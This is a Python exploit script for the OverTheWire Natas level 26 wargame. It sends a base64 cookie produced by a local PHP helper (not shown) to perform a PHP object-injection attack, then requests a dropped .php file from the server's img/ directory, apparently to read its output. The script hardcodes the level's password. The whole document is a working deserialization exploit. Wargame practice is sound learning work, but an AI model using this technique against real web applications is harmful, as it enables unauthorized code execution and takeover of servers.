import requests
import re
import urllib.parse as urllib
import base64

import subprocess
import random
import string


def generate_random_name():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(8))

random_name = generate_random_name()
php_script = "natas26_cookies.php" # imporatant
php_output = subprocess.run(["php", php_script, random_name], capture_output=True, text=True)
output_from_php = php_output.stdout.strip() # Base64 encoded 


username = "natas26"
passsowrd = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
url = "http://%s.natas.labs.overthewire.org/"%username
# Sample 
parameter = "? x1=0 & y1=0 & x2=500 & y2=500".replace(' ','')
session = requests.Session()
response = session.get(url,auth=(username,passsowrd))

session.cookies['drawing'] =  output_from_php # cookies manipulation
response = session.get(url+parameter,auth=(username,passsowrd)) # sends parameter

response = session.get(url+'img/'+random_name+'.php',auth=(username,passsowrd))
content = response.text

print(content)